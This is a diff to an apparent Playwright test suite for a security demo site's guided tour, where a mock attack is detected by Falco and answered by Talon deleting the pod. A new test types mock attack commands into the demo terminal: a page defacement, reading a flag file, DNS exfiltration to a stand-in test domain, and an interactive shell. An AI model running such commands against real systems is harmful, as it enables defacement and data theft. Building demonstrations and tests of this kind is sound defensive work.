@@ -488,10 +488,10 @@ test.describe("layout (ADR 0035, amended 2026-10-05; ?mock=1)", () => {
     await expect(term.locator(".thisrun__timelinewrap")).toBeFocused();
     await expect(term.locator(".thisrun__timelinewrap")).toBeInViewport();
     await expect(term.locator(".thisrun__timeline")).toContainText("Talon deleted the pod");
-    // 5: side by side; its done button puts that run in the live-run console and goes there.
+    // 5: side by side; "Watch it side by side" under it puts that run in the live-run console and goes there.
     await current("compare").getByRole("button", { name: "Launch side by side" }).click();
     await expect(steps.locator('.tour__step[data-id="compare"]')).toHaveAttribute("data-done", "true", { timeout: 20_000 });
-    const show = steps.locator('.tour__step[data-id="compare"]').getByRole("button", { name: "Show the live run" });
+    const show = steps.locator('.tour__step[data-id="compare"]').getByRole("button", { name: "Watch it side by side" });
     await expect(show).toBeVisible();
     await show.click();
     await expect(page.locator("#console-title")).toBeFocused();
@@ -558,13 +558,61 @@ test.describe("layout (ADR 0035, amended 2026-10-05; ?mock=1)", () => {
     await expect(five.locator(".tour__launch")).toContainText(/queued as run [0-9a-f]+\. Both pods show here/, { timeout: 10_000 });
     await expect(five).toHaveAttribute("data-done", "true", { timeout: 20_000 });
     // While that run plays out the button (now "Run it again") is off and says why.
-    const again = five.locator(".tour__btn").first();
+    const again = five.locator(".tour__btn[data-scenario]");
     if (await again.count()) await expect(again).toHaveAttribute("aria-disabled", "true");
-    await expect(five.locator(".tour__twin dt")).toHaveText(["Guarded", "Unguarded"]);
-    await expect(five.locator(".tour__twin dd").first()).toContainText(/Talon answered in [\d.]+ (ms|s)/, { timeout: 20_000 });
+    await expect(five.locator(".tour__twin dt")).toHaveText(["With response", "Without response"]);
+    await expect(five.locator(".tour__twin dd").first()).toContainText(/Talon deleted the pod in [\d.]+ (ms|s)/, { timeout: 20_000 });
     await expect(five.locator(".tour__twin dd").nth(1)).toContainText(/nothing answered/, { timeout: 20_000 });
     // No mark on the hidden card.
     await expect(page.locator('.scenario[data-suggested="true"]')).toHaveCount(0);
+    expect(problems).toEqual([]);
+  });
+
+  test("step 5 pressed: both pods' lines change live under it with nothing scrolled, and 'Watch it side by side' brings the side-by-side view into view", { tag: "@default" }, async ({ page, isMobile }) => {
+    test.setTimeout(90_000);
+    const problems = guardConsole(page);
+    await page.goto("/?mock=1&mock-speed=0.3&mock-siem-delay=3000");
+    const steps = page.locator("#tour-steps");
+    const term = page.locator("#terminal");
+    const input = term.locator("#term-input");
+    if (isMobile) await page.locator("#tour .tour").getByRole("button", { name: "Show the steps" }).click();
+    await term.getByRole("button", { name: /Open the terminal/ }).click();
+    for (const cmd of ["id", "echo pwned>/srv/shop/index.html;echo '{\"status\":\"defaced\"}'>/srv/shop/state.json", "cat /srv/shop/.flag", "nslookup sdp-<flag>.x.exfil.sdp.test.", "sh -i"]) {
+      await expect(term.locator(".term__send")).toBeEnabled({ timeout: 10_000 });
+      await input.fill(cmd);
+      await input.press("Enter");
+    }
+    await expect(steps.locator('.tour__step[data-id="caught"]')).toHaveAttribute("data-done", "true", { timeout: 15_000 });
+    const five = steps.locator('.tour__step[data-id="compare"]');
+    const launch = five.locator(".tour__btn[data-scenario]");
+    await expect.poll(() => launch.getAttribute("aria-disabled"), { timeout: 15_000 }).toBe("false");
+    await launch.click();
+    // On a phone the browser's scroll anchoring may move scrollY to keep what is on screen still as the
+    // lines below the terminal change: there the terminal's place in the document must hold; on a
+    // desktop scrollY itself.
+    const y = await page.evaluate(() => scrollY);
+    const termTop = () => term.evaluate((el) => Math.round(el.getBoundingClientRect().top + scrollY));
+    const top0 = await termTop();
+    const rows = five.locator(".tour__twin dd");
+    await expect(five.locator(".tour__twin dt")).toHaveText(["With response", "Without response"]);
+    const first = [await rows.nth(0).textContent(), await rows.nth(1).textContent()];
+    // Both lines move on as the run plays out: detected, answered / still running and counting.
+    await expect(rows.nth(0)).toContainText(/Talon deleted the pod in [\d.]+ (ms|s)\./, { timeout: 20_000 });
+    await expect(rows.nth(1)).toContainText(/Falco detected it at \d\d:\d\d:\d\d.*nothing answered/, { timeout: 20_000 });
+    expect(await rows.nth(0).textContent()).not.toBe(first[0]);
+    expect(await rows.nth(1).textContent()).not.toBe(first[1]);
+    await expect(five.locator(".tour__armstate").first()).toHaveAttribute("aria-live", "polite");
+    // Nothing scrolled the page for the visitor.
+    expect(await termTop()).toBe(top0);
+    if (!isMobile) expect(await page.evaluate(() => scrollY)).toBe(y);
+    // The visitor's press: the side-by-side view opens (in the default view too) and comes into view.
+    const consoleEl = page.locator("#console");
+    await expect(consoleEl).toBeHidden();
+    await five.getByRole("button", { name: "Watch it side by side" }).click();
+    await expect(consoleEl).toBeVisible();
+    await expect(page.locator("#console-title")).toBeInViewport();
+    await expect(consoleEl.locator(".twin")).toBeVisible();
+    await expect(consoleEl.locator(".twin__arm")).toHaveCount(2);
     expect(problems).toEqual([]);
   });
 
